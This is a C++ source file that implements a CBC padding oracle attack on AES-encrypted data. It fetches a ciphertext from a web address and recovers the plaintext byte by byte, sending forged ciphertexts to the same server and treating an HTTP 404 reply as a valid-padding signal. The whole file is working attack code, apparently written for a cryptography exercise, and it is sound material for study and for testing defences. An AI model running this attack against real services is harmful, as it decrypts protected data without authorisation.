#include <csignal>

#include <cryptopp/hex.h>

#include "PaddingOracle.hpp"

PaddingOracle::PaddingOracle(const std::string &url) :
	url(url),
	smphr(0)
{

}

std::string PaddingOracle::get_cyphertext()
{
	cpr::Response r = cpr::Get(cpr::Url{url});
	return r.text;
}

std::string PaddingOracle::attack(const std::string &cyphertext)
{
	std::vector<std::string> blocks = cypher_to_blocks(cyphertext);
	
	auto block_cnt = blocks.size();

	std::string plaintext;

	/* Decrypt block by block */
	for(unsigned b = block_cnt - 1; b > 0; b--){
		std::string plainblock = decrypt_block(blocks[b], blocks[b - 1]);

		if(b == block_cnt - 1){
			/* If first block, remove padding */
			unsigned len = plainblock.size();
			unsigned padding = plainblock[len - 1];
			plainblock.resize(len - padding);
			plainblock += '\0';
		}

		plaintext = plainblock + plaintext;
	}
	return plaintext;
}

std::vector<std::string> PaddingOracle::cypher_to_blocks(const std::string &cyphertext)
{
	/* Split the cyphertext into 16-byte (32 characters hex-encoded) blocks */
	std::vector<std::string> blocks;
	for(unsigned i = 0; i < cyphertext.length(); i += CryptoPP::AES::BLOCKSIZE*2)
		blocks.push_back(cyphertext.substr(i, CryptoPP::AES::BLOCKSIZE*2));

	return blocks;
}

std::string PaddingOracle::decrypt_block(const std::string &c2, const std::string &c1)
{
	/* Store intermediate decrypt state per block */
	std::string i2(CryptoPP::AES::BLOCKSIZE, 0);

	/* Store the plaintext of the block to return */
	std::string p2(CryptoPP::AES::BLOCKSIZE, 0);

	/* Start the guess equal to C1 */
	std::string guess(c1);

	/* Decode C1. We will need later. */
	std::string c1d = decode_block(c1);

	/* Find all bytes starting from last */
	for(int n = CryptoPP::AES::BLOCKSIZE - 1; n >= 0; n--){
		/* Try all values for each byte, pass when it is exactly the original cyphertext */
		bool passed = false;
		bool decrypted = false;
		uint8_t guessed_c1 = 0;

		for(unsigned i = 0; i < 0x100; i++){
			set_guess(&guess[n*2], i);

			if(!passed && !guess.compare(c1)){
				passed = true;
				continue;
			}

			if(query(guess+c2)){
				decrypted = true;
				guessed_c1 = i;
				break;
			}
		}

		if(!decrypted){
			if(passed)
				guessed_c1 = c1d[n];
			else
				throw std::runtime_error("Byte not decrypted.");
		}

		uint8_t guessed = CryptoPP::AES::BLOCKSIZE - n;

		/* I2 = C1' ^ P2' */
		i2[n] = guessed_c1 ^ guessed;

		/* P2 = I2 ^ C1 */
		p2[n] = i2[n] ^ c1d[n];

		smphr.release();

		/* Optimize: pass the real padding */
		if(n == CryptoPP::AES::BLOCKSIZE - 1 && p2[n] <= 0x10){
			uint8_t real_padding = p2[n];
			n = CryptoPP::AES::BLOCKSIZE - real_padding;
			for(int p = CryptoPP::AES::BLOCKSIZE - guessed - 1; p >= n; p--){
				p2[p] = real_padding;
				i2[p] = c1d[p] ^ p2[p];
			}
			guessed = real_padding;
			smphr.release(real_padding - 1);
		}

		/* Set the next padding */
		unsigned next = guessed + 1;

		/* Set the guess from now until the next padding value */
		for(int g = CryptoPP::AES::BLOCKSIZE - 1; g >= n; g--)
			set_guess(&guess[g*2], i2[g] ^ next);
	}

	return p2;
}

void PaddingOracle::set_guess(char *guess, unsigned value)
{
	/* Encode byte as hex characters */
	CryptoPP::HexEncoder encoder(nullptr, false);
	encoder.Put(static_cast<CryptoPP::byte>(value));
	encoder.MessageEnd();

	/* Put the encoded byte in the right place */
	auto size = encoder.MaxRetrievable();
	encoder.Get(
		reinterpret_cast<CryptoPP::byte*>(guess), 
		size
	);
}

bool PaddingOracle::query(const std::string &cyphertext)
{
	std::string full_url = url+cyphertext;
	cpr::Response r = cpr::Get(cpr::Url{full_url});
	return (r.status_code == cpr::status::HTTP_NOT_FOUND);
}

std::string PaddingOracle::decode_block(const std::string &block)
{
	CryptoPP::HexDecoder decoder;
	decoder.Put(
		reinterpret_cast<const CryptoPP::byte*>(block.data()),
		block.size()
	);
	decoder.MessageEnd();

	auto size = decoder.MaxRetrievable();
	std::string decoded(size, 0);
	decoder.Get(
		reinterpret_cast<CryptoPP::byte*>(decoded.data()), 
		size
	);
	return decoded;
}

void PaddingOracle::wait_progress()
{
	smphr.acquire();
}
